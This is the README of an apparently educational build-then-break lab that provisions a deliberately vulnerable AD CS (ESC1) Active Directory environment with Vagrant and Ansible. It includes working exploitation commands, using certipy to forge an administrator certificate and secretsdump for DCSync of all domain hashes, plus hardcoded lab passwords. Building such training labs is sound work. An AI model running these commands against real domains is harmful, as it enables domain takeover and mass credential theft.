# AD CS ESC1 — A Build-It-Then-Break-It Active Directory Lab

> Learn offensive security the way it actually sticks: **build the target yourself, then exploit it end to end.**

This repository is a fully automated, **Infrastructure-as-Code** lab that stands up a small Active Directory forest with an Enterprise Certificate Authority (AD CS), deliberately misconfigured with the **ESC1** vulnerability — and then hands you the tooling to compromise it from a low-privileged domain user all the way to **Domain Admin** and full directory replication (**DCSync**).

A single `vagrant up` provisions everything: four VMs (Domain Controller, Certificate Authority, Windows 10 client, Kali attacker), the AD domain, the CA, the vulnerable certificate template, a victim user, and the attacker toolkit — with no manual steps.

## Why build the lab *and* break it?

Reading about an attack is not the same as understanding it. This project is built on a simple idea: **you learn how a penetration test really works by first building the target, then exploiting it.**

- **Building** the environment as code forces you to understand the terrain — DNS, Kerberos, Active Directory Certificate Services, certificate templates, enrollment rights, and domain trust. You see *exactly* how a real-world misconfiguration (ESC1) gets introduced, instead of treating it as a black box.
- **Exploiting** it then walks the full kill chain on infrastructure you understand intimately: enumerate the domain → spot the weak template → request a certificate as Administrator → authenticate via Kerberos PKINIT → escalate to Domain Admin → DCSync the whole directory → persist stealthily.
- Because the lab is **reproducible and disposable** (`vagrant destroy` / `vagrant up`), you can break it, patch it, and retry as many times as you want — the feedback loop that actually builds skill.

This mirrors a real engagement: you map the environment, enumerate services and misconfigurations, gain a foothold, escalate privileges, establish persistence, and finally reason about **detection and defense**. You come away understanding *both sides* — how the vulnerability exists **and** how it is abused — not just a copy-paste exploit.

## The vulnerability: AD CS ESC1

**ESC1** is a critical AD CS misconfiguration. A certificate template that simultaneously (1) allows **client authentication**, (2) lets the **enrollee supply the subject** (`ENROLLEE_SUPPLIES_SUBJECT`), and (3) is **enrollable by low-privileged users** lets any domain user request a certificate *in the name of the Domain Administrator* and authenticate as them — privilege escalation from zero to Domain Admin in minutes.

## The learning path

1. **Build** — `vagrant up` provisions the whole lab (this README).
2. **Attack** — follow [`scenario-1/docs/attack-guide.md`](scenario-1/docs/attack-guide.md) step by step: enumerate → request → authenticate → DCSync.
3. **Understand** — every step in the guide explains *what it does and why it works*, not just the command.
4. **Defend** — the guide closes with detection (CA/DC Event IDs) and remediation.
5. **Iterate** — destroy it, rebuild it, try variations, harden it, attack again.

## Prerequisites

Before starting, ensure you have the following installed on your host:

### Required Software

1. **Libvirt/KVM** (native Linux virtualization)
   ```bash
   # Ubuntu/Debian
   sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virt-manager
   sudo usermod -aG libvirt,kvm $USER
   newgrp libvirt
   ```

2. **Vagrant** (2.3.0+) with Libvirt plugin
   ```bash
   # Install Vagrant
   sudo apt install vagrant

   # Install dependencies for vagrant-libvirt
   sudo apt install libvirt-dev

   # Install vagrant-libvirt plugin
   vagrant plugin install vagrant-libvirt
   ```

3. **Ansible** (2.10+)
   ```bash
   # Ubuntu/Debian
   sudo apt install ansible

   # Python WinRM for Windows management
   pip3 install pywinrm
   ```

### System Requirements

- **RAM**: At least 16 GB (20 GB recommended)
- **Disk Space**: At least 80 GB free
- **CPU**: 4 cores minimum (8 cores recommended)

## Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/omar1111eamsa/ad-attack-senario.git
cd ad-attack-senario
```

### 2. Provide the Ansible Vault password

The domain secrets live in an **Ansible Vault** (`group_vars/all/vault.yml`).
The vault password is **not** committed — create the password file once so
provisioning can decrypt unattended (the lab vault password is `vagrant`):

```bash
echo 'vagrant' > scenario-1/infra/ansible/.vault_pass
chmod 600 scenario-1/infra/ansible/.vault_pass
```

### 3. Navigate to Vagrant Directory

```bash
cd scenario-1/infra/vagrant
```

### 4. Start the Environment

```bash
vagrant up
```

**This single command will:**
- Create 4 VMs (DC, CA, Win10, Kali Attacker) with Libvirt/KVM
- Auto-configure network IPs (no manual setup needed!)
- Install Windows Server with Active Directory
- Configure Certificate Authority
- Create ESC1 vulnerable template
- Configure LDAPS
- Set up test user account
- Install attack tools on Kali

**First run takes 30-60 minutes** depending on your internet speed and hardware.

### 5. Wait for Provisioning

The setup is fully automated. Vagrant will provision all VMs using Ansible. Wait until you see:

```
==> attacker: Running provisioner: ansible...
PLAY [Verify network configuration on Windows hosts] ****************************
...
PLAY RECAP *********************************************************************
dc                         : ok=XX    changed=XX    ...
ca                         : ok=XX    changed=XX    ...
win10                      : ok=XX    changed=XX    ...
attacker                   : ok=XX    changed=XX    ...
```

## Exploiting ESC1

### SSH into Attacker Machine

```bash
vagrant ssh attacker
```

### Run the Attack Commands

```bash
# Step 1: Request certificate as Administrator (ESC1 Exploit)
certipy req -u jdoe@serini.lab -p 'Summer2024!' -ca SERINI-CA -target ca.serini.lab -template VulnUserAuth -upn administrator@serini.lab

# Step 2: Authenticate with certificate and get hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10

# Step 3: DCSync - Dump all domain credentials
secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.56.10
```

Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.

## Lab Architecture

```
┌─────────────────────┐
│   Domain Controller │
│   (dc.serini.lab)   │
│   192.168.56.10     │
└──────────┬──────────┘
           │
           │
┌──────────┴──────────┐       ┌─────────────────────┐
│        CA           │       │   Windows 10 Client │
│  (ca.serini.lab)    │       │  (win10.serini.lab) │
│  192.168.56.20      │       │   192.168.56.40     │
└─────────────────────┘       └─────────────────────┘
           │
           │
┌──────────┴──────────┐
│   Kali Attacker     │
│     (attacker)      │
│   192.168.56.50     │
└─────────────────────┘
```

## Project Structure

```
.
├── scenario.txt                      # The training brief (3 scenarios)
├── README.md
└── scenario-1/
    ├── docs/
    │   └── attack-guide.md            # Step-by-step exploitation walkthrough
    ├── infra/
    │   ├── ansible/
    │   │   ├── ansible.cfg
    │   │   ├── inventory.yml          # Hosts only (WinRM + SSH)
    │   │   ├── group_vars/
    │   │   │   ├── all/               # vars.yml (data) + vault.yml (secret)
    │   │   │   ├── windows.yml        # WinRM connection settings
    │   │   │   └── linux.yml          # SSH connection settings
    │   │   └── playbooks/             # numbered in execution order
    │   │       ├── site.yml           # Ordered master pipeline
    │   │       ├── 00-network.yml      01-enable-icmp.yml  02-domain.yml
    │   │       ├── 03-adcs.yml         04-ldaps-config.yml 05-software-gpo.yml
    │   │       ├── 06-kali-tools.yml   07-win10-software.yml 08-esc1-template.yml
    │   │       ├── 09-test-user.yml    10-fix-enroll-permission.yml
    │   │       └── optional/          # manual helpers (not in site.yml)
    │   └── vagrant/
    │       └── Vagrantfile            # 4-VM libvirt definitions + provisioner
    └── scripts/
        ├── 01-create-vulnerable-template.ps1   # ESC1 template injector
        ├── 02-create-test-user.ps1             # jdoe
        └── 08-persistence-dcsync-account.ps1   # post-exploit persistence
```

## Useful Commands

### VM Management

```bash
# Start all VMs
vagrant up

# Stop all VMs
vagrant halt

# Destroy all VMs (clean slate)
vagrant destroy -f

# Check VM status
vagrant status

# SSH into specific VM
vagrant ssh dc       # Domain Controller
vagrant ssh ca       # Certificate Authority
vagrant ssh win10    # Windows 10 client
vagrant ssh attacker # Kali attacker
```

**VM Access:** All VMs have graphical consoles via `virt-manager` or `virt-viewer`. To connect:
```bash
# Open graphical manager
virt-manager

# Or connect to specific VM
virt-viewer dc
```

### Re-run Provisioning

If you need to re-run the Ansible setup:

```bash
cd scenario-1/infra/vagrant
vagrant provision
```

## Manual Ansible Execution

If you want to run Ansible playbooks manually:

```bash
cd scenario-1/infra/ansible

# Run all playbooks
ansible-playbook -i inventory.yml playbooks/site.yml

# Run specific playbook
ansible-playbook -i inventory.yml playbooks/08-esc1-template.yml
```

## Default Credentials

### Domain Admin
- **Username**: `SERINI\Administrator`
- **Password**: `P@ssw0rd123!`

### Test User (for exploitation)
- **Username**: `jdoe`
- **Password**: `Summer2024!`
- **Domain**: `serini.lab`

### Kali Attacker
- **Username**: `vagrant`
- **Password**: `vagrant`

## Troubleshooting

### Docker breaks VM networking (important)

If **Docker** is installed on the host, it sets the iptables/nftables `FORWARD`
policy to `drop` and enables `bridge-nf-call-iptables`, which silently blocks
**guest-to-guest traffic** on the libvirt bridge. Symptoms: the DC builds but
members fail to join with *"the domain cannot be contacted"* or *"trust
relationship failed"*. Stop Docker for the duration of the lab:

```bash
sudo systemctl stop docker docker.socket containerd
sudo sysctl -w net.bridge.bridge-nf-call-iptables=0
sudo systemctl restart libvirtd          # re-adds libvirt's NAT rules cleanly
```

Re-enable Docker later with `sudo systemctl start docker` (the lab networking
will break again while Docker is running).

### VMs Not Starting

```bash
# Check running libvirt domains
sudo virsh list --all

# Or use Vagrant status
vagrant status
```

### Libvirt Network Issues

**VMs not getting IPs:**
```bash
# Check libvirt default network
sudo virsh net-list
sudo virsh net-start vagrant-libvirt  # if not running

# Check VM network interfaces
vagrant ssh dc -c "ipconfig"
```

**Cannot ping between VMs:**
```bash
# From attacker VM
vagrant ssh attacker
ping 192.168.56.10  # Should reach DC
```

### Ansible Connection Errors

```bash
# Test WinRM connectivity
ansible dc -i scenario-1/infra/ansible/inventory.yml -m win_ping
```

### GPO / "Not associated with Active Directory domain or forest"

If `05-software-gpo` fails with that error, the playbook now uses `-Domain serini.lab` for Get-GPO/New-GPO. Ensure `02-domain` and `03-adcs` have completed (including reboots) before `05-software-gpo` runs.

### ESC1 Exploitation Failing

1. Ensure LDAPS is configured:
   ```bash
   cd scenario-1/infra/ansible
   ansible-playbook -i inventory.yml playbooks/04-ldaps-config.yml
   ```

2. Verify template permissions:
   ```bash
   ansible-playbook -i inventory.yml playbooks/10-fix-enroll-permission.yml
   ```

3. Check DNS on Kali:
   ```bash
   vagrant ssh attacker -c "cat /etc/hosts | grep serini"
   ```

## Learning Resources

- [AD CS ESC1 Vulnerability Details](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Active Directory Security](https://adsecurity.org/)

## Disclaimer

This lab is for **educational purposes only**. Only use these techniques in authorized environments. Unauthorized access to computer systems is illegal.

## License

MIT License - See LICENSE file for details

## Contributing

Feel free to open issues or submit pull requests to improve this lab!

## Author

Created for Active Directory security training and ESC1 vulnerability demonstration.
